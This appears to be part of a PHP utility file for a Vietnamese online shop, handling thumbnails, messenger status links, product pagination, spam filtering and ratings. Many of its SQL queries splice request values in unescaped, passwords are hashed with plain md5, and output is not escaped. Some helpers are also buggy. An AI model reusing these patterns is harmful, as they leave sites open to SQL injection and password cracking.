			$src_w = round ($width / $cmp_x * $cmp_y);
			$src_x = round (($width - ($width / $cmp_x * $cmp_y)) / 2);

		} else if ($cmp_y > $cmp_x) {

			$src_h = round ($height / $cmp_y * $cmp_x);
			$src_y = round (($height - ($height / $cmp_y * $cmp_x)) / 2);

		}

		// positional cropping!
		if ($align) {
			if (strpos ($align, 't') !== false) {
				$src_y = 0;
			}
			if (strpos ($align, 'b') !== false) {
				$src_y = $height - $src_h;
			}
			if (strpos ($align, 'l') !== false) {
				$src_x = 0;
			}
			if (strpos ($align, 'r') !== false) {
				$src_x = $width - $src_w;
			}
		}

		imagecopyresampled ($canvas, $image, $origin_x, $origin_y, $src_x, $src_y, $new_width, $new_height, $src_w, $src_h);

    } else {

        // copy and resize part of an image with resampling
        imagecopyresampled ($canvas, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);

    }
	
$ext = end(explode('.',$file_name));
$file_name = basename($file_name, '.'.$ext);
$new_file=$file_name.fns_Rand_digit(0,9,4).'_'.round($new_width).'x'.round($new_height).'.'.$image_ext;
// SHOW THE NEW THUMB IMAGE
if($func=='imagejpeg') $func($canvas, $folder.$new_file,100);
else $func($canvas, $folder.$new_file,floor ($quality * 0.09));

return $new_file;
}

//Lấy chuỗi ngẫu nhiên
function ChuoiNgauNhien($sokytu){
$chuoi="ABCDEFGHIJKLMNOPQRSTUVWXYZWabcdefghijklmnopqrstuvwxyzw0123456789";
for ($i=0; $i < $sokytu; $i++){
	$vitri = mt_rand( 0 ,strlen($chuoi) );
	$giatri= $giatri . substr($chuoi,$vitri,1 );
}
return $giatri;
} 

function yahoo($nick_yahoo='',$icon='1'){
	
	$link = '<a href="ymsgr:sendIM?"'.$nick_yahoo.'"><img src="http://opi.yahoo.com/online?u="'.$nick_yahoo.'"&amp;m=g&amp;t="'.$icon.'""></a>';
	return $link;
}

function check_yahoo($nick_yahoo=''){
	$file = @fopen("http://opi.yahoo.com/online?u=".$nick_yahoo."&m=t&t=1","r");
	$read = @fread($file,200);
	
	if($read==false || strstr($read,"00"))
		$img = '<img src="../images/yahoo_offline.png" />';
	else
		$img = '<img src="../images/yahoo_online.png" />';
	return '<a href="ymsgr:sendIM?'.$nick_yahoo.'">'.$img.'</a>';
}

function skype($nick_skype='',$icon='1'){
	
	$link = '<a href="skype:"'.$nick_skype.'"?call><img src="http://mystatus.skype.com/bigclassic/"'.$nick_skype.'""></a>';
	return $link;
}

function check_skype($nick_skype=''){
	if(strlen(@file_get_contents("http://mystatus.skype.com/bigclassic/".$nick_skype))>2000)
	$img = '<img src="../images/skype_online.png" />';
	else
		$img = '<img src="../images/skype_offline.png" />';
	return '<a href="skype:'.$nick_skype.'?call">'.$img.'</a>';
}

/*
function doc3so($so)
{
    $achu = array ( " không "," một "," hai "," ba "," bốn "," năm "," sáu "," bảy "," tám "," chín " );
    $aso = array ( "0","1","2","3","4","5","6","7","8","9" );
    $kq = "";
    $tram = floor($so/100); // Hàng trăm
    $chuc = floor(($so/10)%10); // Hàng chục
    $donvi = floor(($so%10)); // Hàng đơn vị
    if($tram==0 && $chuc==0 && $donvi==0) $kq = "";
    if($tram!=0)
    {
        $kq .= $achu[$tram] . " trăm ";
        if (($chuc == 0) && ($donvi != 0)) $kq .= " lẻ ";
    }
    if (($chuc != 0) && ($chuc != 1))
    {
            $kq .= $achu[$chuc] . " mươi";
            if (($chuc == 0) && ($donvi != 0)) $kq .= " linh ";
    }
    if ($chuc == 1) $kq .= " mười ";
    switch ($donvi)
    {
        case 1:
            if (($chuc != 0) && ($chuc != 1))
            {
                $kq .= " mốt ";
            }
            else
            {
                $kq .= $achu[$donvi];
            }
            break;
        case 5:
            if ($chuc == 0)
            {
                $kq .= $achu[$donvi];
            }
            else
            {
                $kq .= " năm ";
            }
            break;
        default:
            if ($donvi != 0)
            {
                   $kq .= $achu[$donvi];
            }
            break;
    }
    if($kq=="")
    $kq=0;   
    return $kq;
}
function doctien($number)
{
$donvi=" đồng ";
$tiente=array("nganty" => " nghìn tỷ ","ty" => " tỷ ","trieu" => " triệu ","ngan" =>" nghìn ","tram" => " trăm ");
$num_f=$nombre_format_francais = number_format($number, 2, ',', ' ');
$vitri=strpos($num_f,',');
$num_cut=substr($num_f,0,$vitri);
$mang=explode(" ",$num_cut);
$sophantu=count($mang);
switch($sophantu)
{
    case '5':
            $nganty=doc3so($mang[0]);
            $text=$nganty;
            $ty=doc3so($mang[1]);
            $trieu=doc3so($mang[2]);
            $ngan=doc3so($mang[3]);
            $tram=doc3so($mang[4]);
            if((int)$mang[1]!=0)
            {
                $text.=$tiente['ngan'];
                $text.=$ty.$tiente['ty'];
            }
            else
            {
                $text.=$tiente['nganty'];
            }
            if((int)$mang[2]!=0)
                $text.=$trieu.$tiente['trieu'];
            if((int)$mang[3]!=0)
                $text.=$ngan.$tiente['ngan'];
            if((int)$mang[4]!=0)
                $text.=$tram;
            $text.=$donvi;
            return  $text;
            
            
    break;
    case '4':
            $ty=doc3so($mang[0]);
            $text=$ty.$tiente['ty'];
            $trieu=doc3so($mang[1]);
            $ngan=doc3so($mang[2]);
            $tram=doc3so($mang[3]);
            if((int)$mang[1]!=0)
                $text.=$trieu.$tiente['trieu'];
            if((int)$mang[2]!=0)
                $text.=$ngan.$tiente['ngan'];
            if((int)$mang[3]!=0)
                $text.=$tram;
            $text.=$donvi;
            return $text;
            
            
    break;
    case '3':
            $trieu=doc3so($mang[0]);
            $text=$trieu.$tiente['trieu'];
            $ngan=doc3so($mang[1]);
            $tram=doc3so($mang[2]);
            if((int)$mang[1]!=0)
                $text.=$ngan.$tiente['ngan'];
            if((int)$mang[2]!=0)
                $text.=$tram;
            $text.=$donvi;
            return $text;
    break;
    case '2':
            $ngan=doc3so($mang[0]);
            $text=$ngan.$tiente['ngan'];
            $tram=doc3so($mang[1]);
            if((int)$mang[1]!=0)
                $text.=$tram;
            $text.=$donvi;
            return $text;
                
    break;
    case '1':
            $tram=doc3so($mang[0]);
            $text=$tram.$donvi;
            return $text;
            
    break;
    default:
        echo "Xin lỗi số quá lớn không thể đổi được";
    break;
}
}

function doc_so($so)
{
    $so = preg_replace("([a-zA-Z{!@#$%^&*()_+<>?,.}]*)","",$so);
    if (strlen($so) <= 21)
    {
        $kq = "";
        $c = 0;
        $d = 0;
        $tien = array ( "", " nghìn", " triệu", " tỷ", " nghìn tỷ", " triệu tỷ", " tỷ tỷ" );
        for ($i = 0; $i < strlen($so); $i++)
        {
            if ($so[$i] == "0")
                $d++;
            else break;
        }
        $so = substr($so,$d);
        for ($i = strlen($so); $i > 0; $i-=3)
        {
            $a[$c] = substr($so, $i, 3);
            $so = substr($so, 0, $i);
            $c++;
        }
        $a[$c] = $so;
        for ($i = count($a); $i > 0; $i--)
        {
            if (strlen(trim($a[$i])) != 0)
            {
                if (doc3so($a[$i]) != "")
                {
                    if (($tien[$i-1]==""))
                    {
                        if (count($a) > 2)
                            $kq .= " không trăm lẻ ".doc3so($a[$i]).$tien[$i-1];
                        else $kq .= doc3so($a[$i]).$tien[$i-1];
                    }
                    else if ((trim(doc3so($a[$i])) == "mười") && ($tien[$i-1]==""))
                    {
                        if (count($a) > 2)
                            $kq .= " không trăm ".doc3so($a[$i]).$tien[$i-1];
                        else $kq .= doc3so($a[$i]).$tien[$i-1];
                    }
                    else
                    {
                    $kq .= doc3so($a[$i]).$tien[$i-1];
                    }
                }
            }
        }
        return $kq;
    }
    else
    {
        return "Số quá lớn!";
    }
} 
*/ 

function format_phone_string( $raw_number ) {

    // remove everything but numbers
    $raw_number = preg_replace( '/\D/', '', $raw_number );

    // split each number into an array
    $arr_number = str_split($raw_number);

    // add a dummy value to the beginning of the array
    array_unshift( $arr_number, 'dummy' );

    // remove the dummy value so now the array keys start at 1
    unset($arr_number[0]);

    // get the number of numbers in the number
    $num_number = count($arr_number);

    // loop through each number backward starting at the end
    for ( $x = $num_number; $x >= 0; $x-- ) {

        if ( $x === $num_number - 3 || $x === $num_number - 6) {
            // before the fourth to last number

            $phone_number = "." . $phone_number;
        }
        /*else if ( $x === $num_number - 7 && $num_number > 7 ) {
            // before the seventh to last number
            // and only if the number is more than 7 digits

            $phone_number = ") " . $phone_number;
        }
        else if ( $x === $num_number - 10 ) {
            // before the tenth to last number

            $phone_number = "(" . $phone_number;
        }*/

        // concatenate each number (possibly with modifications) back on
        $phone_number = $arr_number[$x] . $phone_number;
    }

    return $phone_number;
}

function xoaHinhThem($type,$id){
	global $d;
	$d->reset();
	$sql="select id,thumb, photo from #_hinhanh where type='".$type."' and id_hinhanh=".$id;
 	$d->query($sql);
    $list =  $d->result_array();
    //xóa ảnh
    foreach ($list as $k => $v) {
    	$d->reset();
		$sql="delete from #_hinhanh where type='".$type."' and id=".$v['id'];
	 	$d->query($sql);
	 	delete_file(_upload_hinhthem.$v['photo']);
	 	//delete_file(_upload_hinhthem.$v['thumb']);
    }
}
function getSanPhamIndex($iddm,$tranghientai){
global $d,$lang;
if($iddm == '') {
	return ''; 
}
//lấy danh muc:
$d->reset();
$sql="select *, ten$lang as ten from #_product_danhmuc where hienthi=1 and noibat=1 and id=".$iddm;
$d->query($sql);
$item = $d->fetch_array();

echo '<div class="none" id="q_title">'.$item['title'].'</div>';
echo '<div class="none" id="q_keywords">'.$item['keywords'].'</div>';
echo '<div class="none" id="q_description">'.$item['description'].'</div>';
//echo 'Vào='.$vitridau;
//dem tong dong 

$sql="select *,ten$lang as ten from table_product where hienthi=1 and id_danhmuc='".$iddm."' and type='san-pham' and noibat=1 order by stt,id desc";


$d->query($sql);
//echo 'abc';exit();
$tongdong=$d->num_rows();
//echo 'tongdong='.$tongdong;
//Số dòng hiện
$sodonghien=4;

$tongsotrang=ceil($tongdong/$sodonghien);//Định số trang
$vitridau = ($tranghientai-1)*$sodonghien;
//query
$sql="select *,ten$lang as ten from table_product where hienthi=1 and id_danhmuc='".$iddm."' and type='san-pham' and noibat=1 order by stt,id desc";

$sql.=' limit '.$vitridau.','.$sodonghien.'';
$d->query($sql);
$product = $d->result_array();	


/*===============================Xuat file=======================================*/
?> 
<div class="row">
	<?php for($j=0;$j<count($product);$j++){ ?>
	<div class="col-lg-3 col-sm-4 col-6 mb-30">
        <div class="item item_sanpham wow fadeIn" data-wow-duration="1s">
            <div class="item_img phong_to ">
                <a href="san-pham/<?=$product[$j]['tenkhongdau']?>.html">
                  <img src="thumb/400x400x1x90/<?=_upload_sanpham_l.$product[$j]['photo']?>" alt="<?=$product[$j]['ten']?>"  onError="this.src='http://placehold.it/400x400';"  />
                </a>
            </div>
            <h3 class="item_name">
              <a href="san-pham/<?=$product[$j]['tenkhongdau']?>.html"><?=$product[$j]['ten']?></a>
            </h3>
            <div class="item_gia">
              <?php
               	if($product[$j]['giakm']!=0){
               		echo '<span class="del-gia">'.number_format($product[$j]['gia'],0, ',', '.').'<sup>đ</sup></span>';
               		echo '<span class="gia-ban">'.number_format($product[$j]['giakm'],0, ',', '.').'<sup>đ</sup></span>';
               	}else{
               		if($product[$j]['gia']!=0){
               			echo '<span class="gia-ban">'.number_format($product[$j]['gia'],0, ',', '.').'<sup>đ</sup></span>';
               		}else{
               			echo '<a href="lien-he.html" class="gia-ban">'._lienhe.'</a>';
               		}
                }
              ?> 
            </div>
            <div class="item_button">
                <div class="cart">
                    <button class="add-cart active" onclick="return addCart1(<?=$product[$j]['id']?>,'<?=$product[$j]['ten']?>')" data-id="<?=$product[$j]['id']?>" data-name="<?=$product[$j]['ten']?>">
                        <i class="fa fa-cart-plus"></i> <span class="mobi_none"> <?=_themvaogio?></span>
                    </button> 
                </div>
            </div>
        </div><!---END .item-->
    </div><!---END .col-->
    <?php }?>
</div>

<?php 
echo '<div class="clear"></div>';	
echo '<div class="pagination"><ul class="pages">';
	
if($tongsotrang>1){

	$trangtam=$tranghientai-1;
	if($tranghientai>1){
	echo '<li><a class="bam" vitri="0">&laquo;</a></li>';
	
	echo '<li><a class="bam" vitri="'.$trangtam.'">&#8249;</a></li>';
	}


$begin=$tranghientai-2;
$end=$tranghientai+2;
if($begin<1){$begin=1;}
if($end > $tongsotrang){$end=$tongsotrang;}

//echo $end;
for($i=$begin;$i<=$end;$i++){
	$trangtam=$i;
	if($tranghientai==$i){
	echo '<li><a class="bam" vitri="noactive" id="active_z">'.$i.'</a></li>';
	}else{
	echo '<li><a class="bam" vitri="'.$trangtam.'">'.$i.'</a></li>';
		
	}
	
}
if($tranghientai<$tongsotrang){
	$vitritam=$tranghientai+1;
	$vitricuoi=$tongsotrang-1;
	echo '<li><a class="bam" vitri="'.$vitritam.'">&#8250;</a></li>';
	echo '<li><a class="bam" vitri="'.$vitricuoi.'">&raquo;</a></li>';
	}

}

echo '</ul></div>'; 
}

function getThang($thang){
	global $lang;
	$arThangVi=array(
		'01' => 'Tháng Một','02' => 'Tháng Hai','03' => 'Tháng Ba','04' => 'Tháng Tư','05' => 'Tháng Năm','06' => 'Tháng Sáu','07' => 'Tháng Bảy','08' => 'Tháng Tám','09' => 'Tháng Chín','10' => 'Tháng Mười','11' => 'Tháng Mười Một','12' => 'Tháng Mười Hai',
	);
	$arThangEn=array(
		'01' => 'January','02' => 'February','03' => 'March','04' => 'April','05' => 'May','06' => 'June','07' => 'July','08' => 'August','09' => 'September','10' => 'October','11' => 'November','12' => 'December',
	);
	if($lang == ''){
		return $arThangVi[$thang];
	}else{
		return $arThangEn[$thang];
	}
}
function getAllProduct(){
	global $d;
	$d->reset();
	$sql="select *,ten$lang ten from #_product where type='san-pham' and hienthi=1 order by id desc";
	$d->query($sql);
	return $d->result_array();
}
function getHTTTById($id){
	global $d;
	$d->reset();
	$sql="select *,ten$lang ten,noidung$lang noidung from #_news where type='hinh-thuc-thanh-toan' and id= '".$id."'";
	$d->query($sql);
	$kq = $d->fetch_array();
	return  '<p>'.$kq['ten'].'</p>'.$kq['noidung'];
}
function demContact($type){
	global $d;
	$d->reset();
	$sql = "SELECT COUNT(*) as num FROM #_contact where hienthi= 0 and type='".$type."' ";
	$d->query($sql);
	$row_contact = $d->fetch_array();

	return $row_contact['num'];
}
function getUser($id){
	global $d;
	$d->reset();
	$sql = "SELECT *  FROM #_user where id='".$id."' ";
	$d->query($sql);
	$row = $d->fetch_array();
	return $row['username'];
}


function checkEmail($email){
	$sub = '@gmail.com';
	return strpos($email, $sub);
}

function getAddonsOnline($url="",$element="",$type="",$width=0,$height=0,$widththumb=0,$heightthumb=0)
{
    $showtext = "";
    switch($type)
    {
        case 'scriptMain':
            $showtext='<div id="'.$element.'"></div>';
            $showtext.='<script>$(function(){var a=!1;$(window).scroll(function(){$(window).scrollTop()>1 && !a&&($("#'.$element.'").load("ajax/ajax_load_addons.php?type='.$type.'"),a=!0)})});</script>';
            break;
        
        case 'fanpage':
            if($url!='')
            {
	            $showtext='<div id="'.$element.'"></div>';
	            $showtext.='<script>$(function(){var a=!1;$(window).scroll(function(){$(window).scrollTop()>10 && !a&&($("#'.$element.'").load("ajax/ajax_load_addons.php?url='.$url.'&width='.$width.'&height='.$height.'&type='.$type.'"),a=!0)})});</script>';
            }
            break;

        case 'messages':
            if($url!='')
            {
                $showtext='<div id="'.$element.'"></div>';
                $showtext.='<script>$(function(){var a=!1;$(window).scroll(function(){$(window).scrollTop()>10 && !a&&($("#'.$element.'").load("ajax/ajax_load_addons.php?url='.$url.'&type='.$type.'"),a=!0)})});</script>';
            }
            break;

        default:
            break;
    }
    echo $showtext;
}

function checkPhoneVietNam($phone){

	$dausovietnam = array('086','096','097','098','032','033','034','035','036','037','038','039','088','091','094','083','084','085','081','082','089','090','093','070','079','077','076','078','092','056','058','099','059');
	$key = substr($phone, 0,3);
	return in_array($key,$dausovietnam);
}
function checkContentEnglish($noidung){
	$txtEnglish = array('Take a look at this','Wordpress','Woocommerce','premium plugins','Your SEO’s working','FREE 14 days trial','CLICK HERE','How To Master Internet Lead Conversion','yandex.ru','Muchas gracias. ?Como puedo iniciar sesion?');
	foreach($txtEnglish as $val){
		
		if(strpos($noidung, $val)  !== false ){ 
			return true;
		}
	}
	return false;
}

function lamTronSo($number){
	if($number < 1000) { return $number; }
	if($number >= 1000 && $number < 1000000) { 
		return round($number / 1000, 1).'k';
	}
	if($number >= 1000000 && $number < 1000000000) { 
		return round($number / 1000000, 1).'Tr';
	}
	if($number >= 1000000000 && $number < 1000000000000) { 
		return round($number / 1000000000, 1).'T';
	}
}
function kiemtraTenKhongDau($table,$tenkhongdau,$id=0){
	global $d;	
	
	$d->reset();
	$sql="select id from #_".$table." where tenkhongdau = '".$tenkhongdau."' ";
	$d->query($sql);
	$kq = $d->result_array();

	if(($id == 0 && count($kq) >= 1)||($id > 0 && count($kq) >= 1 && $kq[0]['id'] != $id))
	   return false;
	else
		return true;
}

function checkRegexTenKhongDau($tenkhongdau){
	$pattern = '/^[a-zA-Z0-9-]+$/';
	if (preg_match($pattern, $tenkhongdau)){
		return true;
	}else{
		return false;
	}
}

 /* Mã hóa mật khẩu admin */
function encrypt_password($secret='', $str='', $salt='')
{
	return md5($secret.$str.$salt);  
} 

function getRattingProduct($id_product){ 
	global $d;	

	$d->reset();
	$sql="select count(id) as dem, sum(star) as tong_star from #_comment where id_product = '".$id_product."' and hienthi=1";
	$d->query($sql);
	$kq = $d->fetch_array();
	
	$ratting= 0;

	if($kq['dem']){
		$ratting = (int)$kq['tong_star']/(int)$kq['dem'];
		$ratting = round($ratting,2);
	}
	return $ratting;
}
function demdanhGiaSP($id_product){ 
	global $d;	

	$d->reset();
	$sql="select count(id) as dem from #_comment where id_product = '".$id_product."'";
	$d->query($sql);
	$kq = $d->fetch_array();
	

	return $kq['dem'];
}